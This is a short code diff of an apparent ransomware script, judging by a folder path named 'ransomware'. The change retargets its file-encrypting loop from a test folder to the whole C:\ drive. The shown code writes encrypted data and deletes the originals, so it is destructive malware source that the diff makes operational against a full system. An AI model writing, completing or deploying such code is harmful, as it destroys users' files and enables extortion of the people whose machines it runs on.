@@ -16,7 +16,7 @@ def encrypt(file_path):
         file.write(encrypted_data)
         os.remove(file_path)
 
-system = os.walk("C:/Users/Kali/Desktop/ransomware/testes")
+system = os.walk("C:\\")
 for root, dirs, files in system:
     for file in files:
         file_path = os.path.join(root, file)
